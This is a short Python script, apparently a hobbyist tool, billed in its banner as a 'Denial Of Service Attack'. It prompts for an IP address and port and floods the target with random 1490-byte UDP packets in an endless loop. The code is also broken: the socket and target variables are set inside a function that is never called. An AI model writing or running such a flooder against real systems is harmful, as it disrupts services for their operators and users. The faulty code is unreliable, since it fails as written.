import os, sys, socket, random


def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("""
 ██████╗░░█████╗░░██████╗░█████╗░
 ██╔══██╗██╔══██╗██╔════╝██╔══██╗
 ██║░░██║██║░░██║╚█████╗░███████║
 ██║░░██║██║░░██║░╚═══██╗██╔══██║
 ██████╔╝╚█████╔╝██████╔╝██║░░██║
 ╚═════╝░░╚════╝░╚═════╝░╚═╝░░╚═╝

 Denial Of Service Attack

 Coder By : https://github.com/Nux-xader
 Contact  : https://wa.me/6281251389915
 Version  : 1.0.0
 __________________________________________________
""")



def preperate():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)

	ip_addr = input(" [*] IP Address : ")
	port = input(" [*] Port (e.g: 80) :  ")


while True:
	try:
		sock.sendto(bytes, (ip_addr, int(port)))
		print(f" [+] Sent packet to {ip_addr} throught port: {port}")
	except(KeyboardInterrupt):
		print(f" [!] Stop sending packet to {ip_addr}")
		break
	except(EOFError):
		print(f" [!] Stop sending packet to {ip_addr}")
		break

